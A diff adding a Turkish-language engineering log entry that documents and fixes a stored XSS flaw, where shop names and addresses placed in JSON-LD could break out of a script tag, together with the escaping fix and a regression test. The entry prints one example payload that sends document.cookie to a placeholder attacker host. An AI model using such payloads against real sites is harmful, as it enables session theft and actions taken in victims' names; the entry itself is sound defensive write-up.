@@ -213,6 +213,74 @@ kutuları. Esnaf ekranları projenin kendi E2E yardımcılarıyla (`loginAsDemoP
 Ders: bir düzen sondası, **kırpan atayı ve gerçekten çizilen elemanı** hesaba katmadan
 güven vermez. Sıfır bulgu, sondanın yanlış yere baktığının da cevabıdır.
 
+## 2026-08-31 — depolanmış XSS: esnaf, dükkan adı üzerinden script çalıştırabiliyordu
+
+On yedi yerde JSON-LD şöyle basılıyordu:
+
+```tsx
+<script type="application/ld+json"
+  dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
+```
+
+`JSON.stringify` geçerli JSON üretir ama **HTML bağlamını bilmez**: `<`
+karakterini kaçırmaz. `dangerouslySetInnerHTML` de adının söylediği gibi hiçbir
+şey kaçırmaz. Yani gövdedeki bir dize `</script>` içerirse tarayıcı script'i
+orada **kapatır** ve devamını HTML olarak ayrıştırır.
+
+### İstismar yolu
+
+`shop.name` ve `shop.address` JSON-LD'ye **doğrudan** giriyor
+(`src/lib/shop-json-ld.ts`) ve ikisi de **esnaf kontrolünde**
+(`updateShopSettingsAction` adresi 500 karaktere kadar kabul ediyor). Bir esnaf
+dükkan adına şunu yazarsa:
+
+```
+</script><script>fetch('https://kötü/'+document.cookie)</script>
+```
+
+o dükkanın sayfasını açan **herkes** bu script'i çalıştırır.
+
+**Ve çalışır:** `next.config.ts` içindeki CSP `script-src`'de `'unsafe-inline'`
+var — Next'in kendi açılış script'leri için, nonce'a geçilene kadar bilinçli bir
+taviz. Yani CSP burada ikinci bir savunma **değil**.
+
+Oturum çerezi `httpOnly`, yani çerez çalınmaz. Ama saldırgan kurbanın
+tarayıcısında DOM'u okuyabilir ve onun adına server action çağırabilir; o sayfayı
+açan bir **yönetici** için bu, yönetici yetkisiyle istek demek.
+
+### Düzeltme
+
+`src/lib/json-ld-script.ts` → `serializeJsonLd()`. Dokuz dosyadaki on yedi çağrı
+buna bağlandı. Kaçırılan karakterler ve nedenleri:
+
+| Karakter | Neden |
+|---|---|
+| `<` → `\u003c` | `</script>` ile bağlamdan çıkış — asıl olan bu |
+| `>` → `\u003e` | `]]>` gibi dizilerle XHTML/CDATA bağlamı |
+| `&` → `\u0026` | HTML varlık ayrıştırması |
+| U+2028 / U+2029 | JSON'da geçerli, **JavaScript'te satır sonu** sayılır |
+
+Dördü de JSON dizesi **içinde** `\uXXXX` kaçışıyla yazıldığında anlamı
+**değişmez**: `JSON.parse` aynı dizeyi üretir, yani schema.org çıktısı birebir
+aynı kalır. Bu, testte ölçülüyor — SEO'nun bozulmadığı iddia edilmiyor,
+doğrulanıyor.
+
+### Kapsam dışı bırakılan
+
+`blog/[slug]/page.tsx:147` → `dangerouslySetInnerHTML={{ __html: post.content }}`.
+Blog gövdesi **yönetici tarafından** yazılıyor (`/admin/blog`), yani bilinçli bir
+zengin metin özelliği. Riski var (yönetici hesabı ele geçirilirse depolanmış XSS)
+ama bu bir CMS kararı, tek satırlık bir hata değil — ayrı bir iş olarak durmalı.
+
+### Mandal: `src/__tests__/json-ld-xss.test.ts`
+
+Ham `JSON.stringify` + `dangerouslySetInnerHTML` eşleşmesi yasak, artı gerçek
+saldırı yüküyle davranış testleri.
+
+> Tarama ilk koşuşunda **kendi belgelendirmesini** işaretledi: `json-ld-script.ts`
+> doküman yorumunda hatalı kalıbı örnek olarak gösteriyor. Yorum ayıklama eklendi —
+> `service-layer-writes` mandalı aynı tuzağa daha önce düşmüştü.
+
 ## 2026-08-31 — mobil kimlik doğrulama nginx'te on kat gevşek kovadaydı
 
 `/api/mobile/auth/*` hiçbir özel `location`a düşmüyordu, yani `location /`
